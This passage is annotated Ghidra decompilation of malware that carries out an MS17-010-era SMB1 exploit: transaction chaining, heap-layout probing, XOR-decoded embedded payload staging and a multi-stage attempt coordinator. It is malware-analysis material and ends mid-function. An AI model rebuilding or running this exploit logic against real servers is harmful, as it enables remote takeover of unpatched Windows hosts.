 * Ghidra symbol: FUN_10004fb3 | VA: 0x10004FB3 | original source line: 4642
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
undefined4 __fastcall CalculateSmb1TransactionOffset_10004FB3(undefined4 param_1,int param_2,uint param_3,int param_4)

{
  uint *puVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  int unaff_ESI;
  
  puVar1 = (uint *)(unaff_ESI + param_2);
  if ((puVar1[0x1c] == puVar1[0x1e]) && (puVar1[0x1d] == puVar1[0x1f])) {
    uVar6 = 0;
    iVar5 = (puVar1[1] - param_4) - (uint)(*puVar1 < param_3);
    if ((iVar5 < 1) && ((iVar5 < 0 || (*puVar1 - param_3 < 0x100001)))) {
      while( true ) {
        param_2 = param_2 + 8;
        uVar2 = *(uint *)(unaff_ESI + param_2);
        uVar6 = uVar6 + 1;
        if (0x11 < uVar6) break;
        iVar5 = *(int *)(unaff_ESI + 4 + param_2);
        uVar3 = (uint)(uVar2 < param_3);
        uVar4 = iVar5 - param_4;
        if (-1 < (int)(uVar4 - uVar3)) {
          if (uVar4 != uVar3 && SBORROW4(iVar5,param_4) == SBORROW4(uVar4,uVar3)) {
            return 0;
          }
          if (0x100000 < uVar2 - param_3) {
            return 0;
          }
        }
      }
      if (uVar2 == 0 && *(int *)(unaff_ESI + 4 + param_2) == 0) {
        return 1;
      }
    }
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

/*
 * RECONSTRUCTED FUNCTION: InspectSmb1TransactionBoundary_1000501B
 * Ghidra symbol: FUN_1000501b | VA: 0x1000501B | original source line: 4687
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: CalculateSmb1TransactionOffset_10004FB3
 */
undefined4 __thiscall InspectSmb1TransactionBoundary_1000501B(void *this,uint param_1,int param_2)

{
  int in_EAX;
  uint uVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  uint extraout_ECX;
  uint uVar5;
  uint local_c;
  uint local_8;
  
  local_8 = 0;
  iVar3 = 0x4c;
  if (g_smb_payload_variant != '\0') {
    iVar3 = 0x98;
  }
  uVar4 = param_1 & 0xf;
  uVar5 = 0x10 - uVar4;
  do {
    if ((uint)(in_EAX - iVar3) <= uVar5) {
      return 0xffffffff;
    }
    iVar2 = *(int *)(uVar5 + (int)this);
    if (iVar2 == -0x1010102) {
      local_8 = local_8 + 1;
    }
    else if (0x23 < local_8) {
      if (g_smb_payload_variant == '\0') {
        uVar4 = uVar5;
        if (*(int *)(uVar5 + 0x38 + (int)this) == *(int *)(uVar5 + 0x3c + (int)this)) {
          local_c = 0;
          while (iVar2 - param_1 < 0x100001) {
            uVar4 = uVar4 + 4;
            local_c = local_c + 1;
            if (0x11 < local_c) {
              uVar1 = (uint)(*(int *)(uVar4 + (int)this) == 0);
              goto LAB_100050a9;
            }
            iVar2 = *(int *)(uVar4 + (int)this);
          }
        }
        uVar1 = 0;
      }
      else {
        uVar1 = CalculateSmb1TransactionOffset_10004FB3(uVar4,uVar5,param_1,param_2);
        uVar4 = extraout_ECX;
      }
LAB_100050a9:
      if (uVar1 != 0) {
        _DAT_1001fae0 = uVar5 + param_1;
        _DAT_1001fae4 = param_2 + (uint)CARRY4(uVar5,param_1);
        return 0;
      }
    }
    uVar5 = uVar5 + 4;
  } while( true );
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1AssembleTransactionBuffers_100050E0
 * Ghidra symbol: FUN_100050e0 | VA: 0x100050E0 | original source line: 4750
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1BuildTransactionFragmentChain_10004C1C, InspectSmb1TransactionBoundary_1000501B
 */
Smb1AssembleTransactionBuffers_100050E0(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined4 param_6,uint param_7,int param_8,uint param_9)

{
  uint uVar1;
  uint uVar2;
  void *this;
  undefined4 uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  bool bVar7;
  uint local_24;
  int local_20;
  uint local_10;
  void *local_c;
  void *local_8;
  
  uVar2 = param_9 & 0xffff;
  uVar5 = 0x400;
  this = (void *)AllocateZeroedHeapBuffer_10001000(uVar2);
  if (this == (void *)0x0) {
LAB_10005106:
    uVar3 = 0xffffffff;
  }
  else {
    param_9 = param_9 & 0xffff;
    local_8 = (void *)0x0;
    local_10 = 0;
    local_24 = param_7;
    local_20 = param_8;
    uVar6 = 0;
    local_c = this;
    do {
      if ((ushort)param_9 == 0) {
LAB_100051dc:
        ReleaseTemporaryNetworkBuffer_100020D0();
        goto LAB_10005106;
      }
      if ((ushort)param_9 < (ushort)uVar5) {
        uVar5 = param_9 & 0xffff;
      }
      iVar4 = Smb1BuildTransactionFragmentChain_10004C1C(param_1,param_2,param_3,param_4,param_5,local_24,local_20,DAT_1001fae8,
                           DAT_1001faec,uVar5,&local_8,(ushort *)&local_10);
      if (iVar4 == -1) {
LAB_100051e6:
        ReleaseTemporaryNetworkBuffer_100020D0();
        goto LAB_100051dc;
      }
      if (local_8 == (void *)0x0) goto LAB_100051dc;
      uVar1 = (local_10 & 0xffff) + uVar6;
      if (uVar2 <= uVar1) goto LAB_100051e6;
      memcpy((void *)((int)this + uVar6),local_8,local_10 & 0xffff);
      ReleaseTemporaryNetworkBuffer_100020D0();
      bVar7 = CARRY4(local_24,uVar5);
      local_24 = local_24 + uVar5;
      local_20 = local_20 + (uint)bVar7;
      param_9 = param_9 - uVar5;
      iVar4 = InspectSmb1TransactionBoundary_1000501B(this,param_7,param_8);
      uVar6 = uVar1;
    } while (iVar4 != 0);
    ReleaseTemporaryNetworkBuffer_100020D0();
    uVar3 = 0;
  }
  return uVar3;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1ChainTransactionBuffers_100051F3
 * Ghidra symbol: FUN_100051f3 | VA: 0x100051F3 | original source line: 4820
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: ReadWinsockLibraryStatus_10002088, ReleaseTemporaryNetworkBuffer_100020D0, Smb1BuildTransactionFragmentChain_10004C1C, Smb1AssembleTransactionBuffers_100050E0
 */
Smb1ChainTransactionBuffers_100051F3(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  undefined4 unaff_EDI;
  bool bVar4;
  ushort local_c [2];
  int local_8;
  
  local_8 = 0;
  local_c[0] = 0;
  local_c[1] = 0;
  uVar3 = 0x28;
  if (g_smb_payload_variant != '\0') {
    uVar3 = 0x40;
  }
  iVar1 = Smb1BuildTransactionFragmentChain_10004C1C(param_1,param_2,param_3,param_4,param_5,DAT_1001fad8,DAT_1001fadc,
                       DAT_1001fae8,DAT_1001faec,uVar3,&local_8,local_c);
  if (iVar1 != -1) {
    if (g_smb_payload_variant == '\0') {
      DAT_1001fb00 = *(uint *)(local_8 + 0x24);
      DAT_1001fb04 = 0;
      if (0x7fffffff < DAT_1001fb00) goto LAB_100052a0;
    }
    else {
      DAT_1001fb00 = *(uint *)(local_8 + 0x38);
      DAT_1001fb04 = *(int *)(local_8 + 0x3c);
      iVar1 = ReadWinsockLibraryStatus_10002088(DAT_1001fb00,DAT_1001fb04);
      if (iVar1 != 0) {
LAB_100052a0:
        ReleaseTemporaryNetworkBuffer_100020D0();
        if (g_smb_payload_variant == '\0') {
          bVar4 = DAT_1001fb00 < 0xb00;
          uVar3 = DAT_1001fb00 - 0xb00;
        }
        else {
          bVar4 = DAT_1001fb00 < 0x1000;
          uVar3 = DAT_1001fb00 - 0x1000;
        }
        iVar1 = Smb1AssembleTransactionBuffers_100050E0(param_1,param_2,param_3,param_4,param_5,unaff_EDI,uVar3,
                             DAT_1001fb04 - (uint)bVar4,0x1000);
        if (iVar1 == 0) {
          return 0;
        }
        uVar2 = Smb1AssembleTransactionBuffers_100050E0(param_1,param_2,param_3,param_4,param_5,unaff_EDI,DAT_1001fb00 - 0x1800
                             ,DAT_1001fb04 - (uint)(DAT_1001fb00 < 0x1800),0x2800);
        return uVar2;
      }
    }
  }
  ReleaseTemporaryNetworkBuffer_100020D0();
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1StageMultiRequestExchange_10005333
 * Ghidra symbol: FUN_10005333 | VA: 0x10005333 | original source line: 4882
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReadWinsockLibraryStatus_10002088, ReleaseTemporaryNetworkBuffer_100020D0, Smb1ExchangeNtTransaction_1000330E, Smb1ExchangeDataBlockVariantA_10003734, Smb1BuildAndSendLargeTransaction_10003986, Smb1StageLargeTransactionBuffer_10004820, Smb1BuildNextTransactionFragment_10004AFE, Smb1BuildTransactionFragmentChain_10004C1C
 */
Smb1StageMultiRequestExchange_10005333(undefined4 param_1,int param_2,undefined4 param_3,undefined4 *param_4,
            undefined4 param_5,undefined4 param_6,byte *param_7)

{
  byte bVar1;
  int iVar2;
  byte *pbVar3;
  SIZE_T SVar4;
  uint uVar5;
  int iVar6;
  undefined2 unaff_BX;
  int iVar7;
  void *pvVar8;
  undefined4 uVar9;
  bool bVar10;
  undefined2 uVar11;
  SIZE_T local_18 [2];
  void *local_10;
  uint local_c;
  uint *local_8;
  
  local_10 = (void *)0x0;
  iVar2 = Smb1ExchangeDataBlockVariantA_10003734(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,(short)param_5,
                       (undefined2 *)&local_10,(char)param_7);
  if (iVar2 == -1) {
    return 0xffffffff;
  }
  param_7 = (byte *)AllocateZeroedHeapBuffer_10001000(0x2f);
  iVar2 = DAT_1001fb14;
  if (param_7 == (byte *)0x0) {
    return 0xffffffff;
  }
  bVar10 = g_smb_payload_variant != '\0';
  param_7[0xf] = 4;
  uVar5 = iVar2 + 4;
  param_7[0x1f] = 0x10;
  param_7[0x2c] = 1;
  if (bVar10) {
    uVar5 = iVar2 + 8;
  }
  uVar11 = SUB42(local_10,0);
  local_8 = (uint *)Smb1BuildNextTransactionFragment_10004AFE(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,
                                 uVar11,0x20,param_7,0x2f,DAT_1001fae8,DAT_1001faec,uVar5 & 0xffff);
  ReleaseTemporaryNetworkBuffer_100020D0();
  if (local_8 == (uint *)0xffffffff) {
    return 0xffffffff;
  }
  if (DAT_1001fb40 == 0) {
    iVar2 = (uint)(g_smb_payload_variant != '\0') * 4;
    local_c = iVar2 + 4;
    local_18[0] = iVar2 + 0x13;
    param_7 = (byte *)AllocateZeroedHeapBuffer_10001000(local_18[0]);
    iVar2 = DAT_1001faec;
    if (param_7 == (byte *)0x0) {
      return 0xffffffff;
    }
    uVar5 = (uint)DAT_1001fb20;
    if (g_smb_payload_variant == '\0') {
      *(uint *)(param_7 + 0xf) = uVar5 + DAT_1001fae8;
    }
    else {
      iVar6 = DAT_1001faec + (uint)CARRY4(uVar5,DAT_1001fae8);
      *(uint *)(param_7 + 0xf) = uVar5 + DAT_1001fae8;
      *(int *)(param_7 + 0x13) = iVar6;
    }
    local_8 = (uint *)Smb1BuildNextTransactionFragment_10004AFE(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,
                                   uVar11,local_c,param_7,local_18[0],DAT_1001fae8,iVar2,
                                   (uint)(ushort)DAT_1001fb10);
    ReleaseTemporaryNetworkBuffer_100020D0();
    if (local_8 == (uint *)0xffffffff) {
      return 0xffffffff;
    }
    DAT_1001fb40 = 1;
    param_7 = (byte *)AllocateZeroedHeapBuffer_10001000(0x10);
    iVar2 = DAT_1001faec;
    if (param_7 == (byte *)0x0) {
      return 0xffffffff;
    }
    uVar5 = (uint)DAT_1001fb34;
    param_7[0xf] = 1;
    local_8 = (uint *)Smb1BuildNextTransactionFragment_10004AFE(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,
                                   uVar11,1,param_7,0x10,DAT_1001fae8,iVar2,uVar5);
    ReleaseTemporaryNetworkBuffer_100020D0();
    if (local_8 == (uint *)0xffffffff) {
      return 0xffffffff;
    }
  }
  param_7 = (byte *)AllocateZeroedHeapBuffer_10001000(0x13);
  if (param_7 == (byte *)0x0) {
    return 0xffffffff;
  }
  *(undefined2 *)(param_7 + 0x11) = uVar11;
  param_7[0xf] = 0x36;
  param_7[0x10] = 0;
  local_8 = (uint *)Smb1BuildNextTransactionFragment_10004AFE(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,
                                 uVar11,4,param_7,0x13,DAT_1001fae8,DAT_1001faec,(uint)DAT_1001fb20)
  ;
  ReleaseTemporaryNetworkBuffer_100020D0();
  if (local_8 == (uint *)0xffffffff) {
    return 0xffffffff;
  }
  if (DAT_1001fb3c != 0) {
    pbVar3 = (byte *)AllocateZeroedHeapBuffer_10001000(0x10);
    if (pbVar3 == (byte *)0x0) {
      return 0xffffffff;
    }
    param_7 = pbVar3;
    iVar6 = Smb1BuildNextTransactionFragment_10004AFE(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,uVar11,1,
                         pbVar3,0x10,DAT_1001fae8,DAT_1001faec,(uint)DAT_1001fb1c);
    iVar2 = DAT_1001faec;
    if (iVar6 == -1) goto LAB_10005593;
    uVar5 = (uint)DAT_1001fb2c;
    pbVar3[0xf] = 2;
    local_8 = (uint *)Smb1BuildNextTransactionFragment_10004AFE(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,
                                   uVar11,1,pbVar3,0x10,DAT_1001fae8,iVar2,uVar5);
    ReleaseTemporaryNetworkBuffer_100020D0();
    if (local_8 == (uint *)0xffffffff) {
      return 0xffffffff;
    }
  }
  if (DAT_1001fb38 != 0) {
    param_7 = (byte *)AllocateZeroedHeapBuffer_10001000(0x10);
    if (param_7 == (byte *)0x0) {
      return 0xffffffff;
    }
    local_8 = (uint *)Smb1BuildNextTransactionFragment_10004AFE(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,
                                   uVar11,1,param_7,0x10,DAT_1001fae8,DAT_1001faec,
                                   (uint)DAT_1001fb30);
    ReleaseTemporaryNetworkBuffer_100020D0();
    if (local_8 == (uint *)0xffffffff) {
      return 0xffffffff;
    }
    DAT_1001fb38 = 0;
  }
  iVar2 = (uint)(g_smb_payload_variant != '\0') * 4;
  local_c = iVar2 + 4;
  SVar4 = iVar2 + 0x13;
  param_7 = (byte *)AllocateZeroedHeapBuffer_10001000(SVar4);
  if (param_7 == (byte *)0x0) {
    return 0xffffffff;
  }
  iVar2 = Smb1BuildNextTransactionFragment_10004AFE(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,uVar11,local_c,
                       param_7,SVar4,DAT_1001fae8,DAT_1001faec,(uint)DAT_1001fb28);
  ReleaseTemporaryNetworkBuffer_100020D0();
  if (iVar2 == -1) {
    return 0xffffffff;
  }
  DAT_1001fb3c = 1;
  param_7 = (byte *)AllocateZeroedHeapBuffer_10001000(0xf);
  if (param_7 == (byte *)0x0) {
    return 0xffffffff;
  }
  local_10 = (void *)0x0;
  local_8 = (uint *)0x0;
  iVar2 = Smb1BuildAndSendLargeTransaction_10003986(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,DAT_1001fb44,0,
                       0,param_7,(int *)&local_8,(undefined2 *)&local_10,'\0');
  ReleaseTemporaryNetworkBuffer_100020D0();
  if (iVar2 == -1) {
    return 0xffffffff;
  }
  iVar2 = Smb1BuildTransactionFragmentChain_10004C1C(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,
                       DAT_1001fb28 + DAT_1001fae8,
                       DAT_1001faec + (uint)CARRY4((uint)DAT_1001fb28,DAT_1001fae8),DAT_1001fae8,
                       DAT_1001faec,local_c,&local_8,(ushort *)&local_10);
  if (iVar2 != -1) {
    if (g_smb_payload_variant == '\0') {
      if (3 < (ushort)local_10) {
        DAT_1001faf8 = *local_8;
        DAT_1001fafc = 0;
        if (0x7fffffff < DAT_1001faf8) goto LAB_100057ab;
      }
    }
    else if (7 < (ushort)local_10) {
      DAT_1001faf8 = *local_8;
      DAT_1001fafc = local_8[1];
      iVar2 = ReadWinsockLibraryStatus_10002088(DAT_1001faf8,DAT_1001fafc);
      if (iVar2 != 0) {
LAB_100057ab:
        ReleaseTemporaryNetworkBuffer_100020D0();
        iVar2 = DAT_1001faf8 + 0x100;
        pvVar8 = (void *)(DAT_1001fafc + (0xfffffeff < DAT_1001faf8));
        local_18[0] = (uint)(g_smb_payload_variant == '\0') * 2 + 0xe5c;
        local_10 = (void *)AllocateZeroedHeapBuffer_10001000(local_18[0]);
        if (local_10 == (void *)0x0) {
          return 0xffffffff;
        }
        if (g_smb_payload_variant == '\0') {
          *(undefined2 *)((int)local_10 + 0xf) = 1000;
          *(undefined2 *)((int)local_10 + 0x14) = 0x4c2;
          param_7 = &DAT_100131a8;
          pbVar3 = (byte *)((int)local_10 + 0x17);
          local_c = 0xe47;
          do {
            bVar1 = *param_7;
            param_7 = param_7 + 1;
            *pbVar3 = bVar1 ^ 0xcc;
            pbVar3 = pbVar3 + 1;
            local_c = local_c + -1;
          } while (local_c != 0);
        }
        else {
          *(undefined2 *)((int)local_10 + 0xf) = 0x1e8;
          *(undefined1 *)((int)local_10 + 0x14) = 0xc3;
          param_7 = &DAT_100131a8;
          pbVar3 = (byte *)((int)local_10 + 0x15);
          local_c = 0xe47;
          do {
            bVar1 = *param_7;
            param_7 = param_7 + 1;
            *pbVar3 = bVar1 ^ 0xcc;
            pbVar3 = pbVar3 + 1;
            local_c = local_c + -1;
          } while (local_c != 0);
          local_c = 0;
        }
        if (g_smb_payload_variant == '\0') {
          local_8 = (uint *)0x4;
          param_7 = (byte *)CONCAT13(0x38,param_7._0_3_);
        }
        else {
          local_8 = (uint *)0x8;
          param_7 = (byte *)CONCAT13(0x70,param_7._0_3_);
        }
        iVar6 = Smb1BuildNextTransactionFragment_10004AFE(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,
                             (short)param_6,local_8,local_10,local_18[0],iVar2,(int)pvVar8,0);
        ReleaseTemporaryNetworkBuffer_100020D0();
        if (iVar6 != -1) {
          if ((DAT_1001faf0 != iVar2) || (DAT_1001faf4 != pvVar8)) {
            uVar5 = DAT_1001fb08 + -0x200 + DAT_1001fb24;
            if ((ushort)uVar5 < 0xfe81) {
              iVar6 = Smb1StageLargeTransactionBuffer_10004820(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,
                                   (short)param_6,iVar2,pvVar8,uVar5 & 0xffff);
            }
            else {
              iVar6 = -1;
            }
            DAT_1001faf0 = iVar2;
            DAT_1001faf4 = pvVar8;
          }
          if (iVar6 != -1) {
            iVar7 = ((uint)param_7 >> 0x18) + _DAT_1001fae0;
            local_10 = (void *)(_DAT_1001fae4 + (uint)CARRY4((uint)param_7 >> 0x18,_DAT_1001fae0));
            if ((DAT_1001faf0 != iVar7) || (DAT_1001faf4 != local_10)) {
              uVar5 = DAT_1001fb08 + -0x200 + DAT_1001fb24;
              if ((ushort)uVar5 < 0xfe81) {
                iVar6 = Smb1StageLargeTransactionBuffer_10004820(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,
                                     (short)param_6,iVar7,local_10,uVar5 & 0xffff);
              }
              else {
                iVar6 = -1;
              }
              DAT_1001faf0 = iVar7;
              DAT_1001faf4 = local_10;
            }
            if (iVar6 == -1) {
              return 0xffffffff;
            }
            DAT_1001fb08 = 0x200;
            iVar2 = Smb1StageLargeTransactionBuffer_10004820(param_1,(short)param_2,(short)param_3,(short)param_4,unaff_BX,0,
                                 iVar2,pvVar8,0);
            uVar9 = 0xffffffff;
            if ((iVar2 != -1) &&
               (param_4 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(0xc), param_4 != (undefined4 *)0x0)) {
              param_2 = 0;
              local_10 = (void *)AllocateZeroedHeapBuffer_10001000(0xd);
              if (local_10 != (void *)0x0) {
                uVar9 = Smb1ExchangeNtTransaction_1000330E(param_1,0,(short)param_3,0xfeff,unaff_BX,(short)param_5,0xf0,
                                     param_4,local_10,0xd,&param_2,&local_10,(undefined2 *)local_18)
                ;
                ReleaseTemporaryNetworkBuffer_100020D0();
                ReleaseTemporaryNetworkBuffer_100020D0();
              }
            }
            return uVar9;
          }
        }
        return 0xffffffff;
      }
    }
  }
LAB_10005593:
  ReleaseTemporaryNetworkBuffer_100020D0();
  return 0xffffffff;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1CleanupSession_10005A46
 * Ghidra symbol: FUN_10005a46 | VA: 0x10005A46 | original source line: 5170
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: Smb1ExchangeTransactionVariantA_100030FE, Smb1ExchangeTransactionVariantB_100031FB
 */
Smb1CleanupSession_10005A46(undefined4 param_1,undefined4 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined2 param_6,undefined2 param_7)

{
  Smb1ExchangeTransactionVariantA_100030FE(param_2,param_3,param_4,param_5,param_6,param_7);
  Smb1ExchangeTransactionVariantB_100031FB(param_2,param_3,param_4,param_5,param_6,param_7);
  return param_1;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1Ms17010MultiStageAttempt_10005A7E
 * Ghidra symbol: FUN_10005a7e | VA: 0x10005A7E | original source line: 5182
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: Ordinal_3
 * Direct function references: AllocateZeroedHeapBuffer_10001000, WinsockCleanupAfterAttempt_10002068, GetTickCounterLowWord_100020B2, ReleaseTemporaryNetworkBuffer_100020D0, DecodeAndAdaptEmbeddedSmbPayload_100020EA, Smb1ParseServerReplyVersion_100022A2, Smb1TransmitRequestBuffer_1000243F, Smb1BuildNtTransactRequest_10002547, Smb1ExchangeInitialRequest_10002EF5, Smb1ExchangeSessionSetup_10002F88, Smb1ExchangeTreeConnection_10003061, Smb1ExchangeTransactionVariantB_100031FB, Smb1ExchangeNtTransaction_1000330E, Smb1SendAndReceiveTransactionFragment_100035FA, Smb1SendAndReceiveEcho_1000369D, Smb1ProbeTransactionVariantA_10003B5D, Smb1ProbeTransactionVariantB_10003C0A, Smb1PrepareComplexTransaction_10003CA0
 * Local name rewrites: iVar6 -> attempt_stage_result, local_2c -> first_tick_tag_low16, local_38 -> second_tick_tag_low16
 * Parameter names recovered semantically: param_1 -> socket_table, param_2 -> target_ipv4_address, param_3 -> target_tcp_port, param_4 -> payload_builder_callback, param_5 -> builder_argument_a, param_6 -> builder_argument_b, param_7 -> builder_argument_c, param_8 -> builder_argument_d, param_9 -> builder_argument_e, param_10 -> builder_argument_f
 * ANALYST OBSERVATION: Core multi-stage SMB1 transaction and vulnerability-attempt coordinator.
 * ANALYST OBSERVATION: Called by 0x1000668A in two passes; version and transport checks precede payload preparation.
 * ANALYST OBSERVATION: The evidence supports an MS17-010-era exploitation path; it does not cleanly isolate EternalBlue from EternalRomance.
 */
Smb1Ms17010MultiStageAttempt_10005A7E(undefined4 *socket_table,undefined4 target_ipv4_address,undefined4 target_tcp_port,undefined *payload_builder_callback,
            undefined4 builder_argument_a,undefined4 builder_argument_b,undefined4 builder_argument_c,undefined4 builder_argument_d,
            undefined4 builder_argument_e,undefined4 builder_argument_f)

{
  void *pvVar1;
  SIZE_T _Size;
  undefined1 uVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  int attempt_stage_result;
  size_t *psVar7;
  undefined4 uVar8;
  undefined4 extraout_ECX;
  undefined *puVar9;
  undefined4 *puVar10;
  undefined *puVar11;
  bool bVar12;
  undefined4 uVar13;
  ushort uVar14;
  undefined4 uVar15;
  undefined2 uVar16;
  undefined4 *puVar17;
  undefined4 uVar18;
  undefined2 uVar19;
  undefined4 local_3c;
  uint second_tick_tag_low16;
  undefined4 local_34;
  undefined4 *local_30;
  uint first_tick_tag_low16;
  int local_28;
  void *local_24;
  undefined4 *local_20;
  size_t local_1c;
  void *local_18;
  SIZE_T local_14;
  byte *local_10;
  undefined4 *local_c;
  
  do {
    attempt_stage_result = OpenTcpConnectionToSmbTarget_10006727((int *)&socket_table,target_ipv4_address,target_tcp_port);
    if (attempt_stage_result != 0) {
      return 0xffffffff;
    }
    uVar3 = GetTickCounterLowWord_100020B2();
    first_tick_tag_low16 = uVar3 & 0xffff;
    local_30 = (undefined4 *)0xfeff;
    local_34 = 0;
    local_3c = 0;
    uVar4 = GetTickCounterLowWord_100020B2();
    puVar10 = socket_table;
    second_tick_tag_low16 = uVar4 & 0xffff;
    local_20 = (undefined4 *)0x0;
    local_28 = 0;
    local_1c = 0;
    local_18 = (void *)0x0;
    attempt_stage_result = Smb1ExchangeInitialRequest_10002EF5(0xc007,(short)uVar3,0xfeff,(short)uVar4);
    if (attempt_stage_result != 0) {
      return 0xffffffff;
    }
    attempt_stage_result = Smb1ExchangeSessionSetup_10002F88(0xc007,(short)first_tick_tag_low16,0xfeff,(undefined2 *)&local_3c,(short)second_tick_tag_low16,0xd,0
                         ,0,&local_28,(undefined2 *)&local_1c);
    if (attempt_stage_result != 0) {
      return 0xffffffff;
    }
    if (local_28 == 0) {
LAB_10006357:
      uVar8 = 0;
LAB_10006361:
      Smb1ExchangeTransactionVariantB_100031FB(*puVar10,(short)first_tick_tag_low16,(short)uVar8,0xfeff,(short)local_3c,(short)second_tick_tag_low16);
      WinsockCleanupAfterAttempt_10002068();
      return 0xffffffff;
    }
    uVar2 = Smb1ParseServerReplyVersion_100022A2((ushort)local_1c);
    local_24 = (void *)CONCAT31(local_24._1_3_,uVar2);
    ReleaseTemporaryNetworkBuffer_100020D0();
    if ((char)local_24 == -1) goto LAB_10006357;
    attempt_stage_result = Smb1ExchangeTreeConnection_10003061((short)first_tick_tag_low16,(undefined2 *)&local_34,0xfeff,(short)local_3c,
                         (short)second_tick_tag_low16);
    if (attempt_stage_result != 0) {
      uVar8 = local_34;
      goto LAB_10006361;
    }
    local_c = (undefined4 *)AllocateZeroedHeapBuffer_10001000(0xc);
    if (local_c == (undefined4 *)0x0) {
      return 0xffffffff;
    }
    local_14 = Smb1ExchangeNtTransaction_1000330E(*puVar10,(short)first_tick_tag_low16,(short)local_34,0xfeff,(short)local_3c,
                            (short)second_tick_tag_low16 + 1,0xf0,local_c,(void *)0x0,0,(int *)&local_18,
                            &local_28,(undefined2 *)&local_1c);
    ReleaseTemporaryNetworkBuffer_100020D0();
    if ((local_14 == 0xffffffff) || (local_28 == 0)) goto LAB_10006618;
    if (*(short *)(local_28 + 0x1a) == 0x11) {
      attempt_stage_result = *(int *)(local_28 + 0x16);
      g_smb_payload_variant = -1;
      if (attempt_stage_result == 0) {
        g_smb_payload_variant = (char)attempt_stage_result;
      }
      if (attempt_stage_result == 1) {
        g_smb_payload_variant = (char)attempt_stage_result;
      }
      if (payload_builder_callback == (undefined *)0x0) {
        ReleaseTemporaryNetworkBuffer_100020D0();
        uVar16 = 0xfeff;
        uVar8 = *puVar10;
        uVar13 = 0xd04b1e;
        uVar4 = first_tick_tag_low16;
        uVar15 = local_34;
        uVar18 = local_3c;
        uVar3 = second_tick_tag_low16;
        goto LAB_1000662d;
      }
      uVar3 = *(uint *)(local_28 + 0x12);
      local_10 = (byte *)(((uVar3 & 0xff0000 | uVar3 >> 0x10) >> 8 |
                          (uVar3 << 0x10 | uVar3 & 0xff00) << 8) ^ uVar3 * 2);
      ReleaseTemporaryNetworkBuffer_100020D0();
      if (local_10 == (byte *)0x0) goto LAB_10006618;
      local_1c = 0;
      local_30 = (undefined4 *)0x0;
      bVar12 = g_smb_payload_variant != '\x01';
      if (bVar12) {
        puVar9 = &DAT_10017090;
        puVar11 = &DAT_10016020;
      }
      else {
        puVar9 = &DAT_1001f900;
        puVar11 = &DAT_10017860;
      }
      (*(code *)payload_builder_callback)(builder_argument_a,builder_argument_b,puVar11,(bVar12 - 1 & 0x200) + 0x1070,puVar9,
                         (bVar12 - 1 & 0xfffffa00) + 0x7ce,&local_30,&local_1c,builder_argument_c,builder_argument_d,
                         builder_argument_e,builder_argument_f);
      local_14 = 0;
      local_18 = (void *)0x0;
      attempt_stage_result = DecodeAndAdaptEmbeddedSmbPayload_100020EA(&local_14,local_1c,(char)local_24);
      _Size = local_14;
      if (attempt_stage_result != 0) goto LAB_10006618;
      local_20 = (undefined4 *)(local_14 + 8 + local_1c);
      if (((uint)local_20 & 3) != 0) {
        local_20 = (undefined4 *)((int)local_20 + (4 - ((uint)local_20 & 3)));
      }
      local_24 = (void *)AllocateZeroedHeapBuffer_10001000((SIZE_T)local_20);
      if ((local_24 == (void *)0x0) || (local_30 == (undefined4 *)0x0)) goto LAB_10006613;
      memcpy(local_24,local_18,_Size);
      psVar7 = (size_t *)((int)local_24 + _Size);
      *psVar7 = local_1c;
      psVar7[1] = 1;
      memcpy(psVar7 + 2,local_30,local_1c);
      ReleaseTemporaryNetworkBuffer_100020D0();
      local_28 = 0;
      local_18 = (void *)0x0;
      uVar3 = (uint)local_20 >> 0xc;
      local_c = (undefined4 *)((uint)local_20 & 0xfff);
      if ((uVar3 == 0) || (local_14 = 0, uVar3 == 0)) goto LAB_100065a5;
      break;
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
    attempt_stage_result = Smb1SendAndReceiveTransactionFragment_100035FA(extraout_ECX,0xffff,0x2801,(short)first_tick_tag_low16,(short)local_34,0xfeff,
                         (short)local_3c,(short)second_tick_tag_low16,'\x02',-1,0);
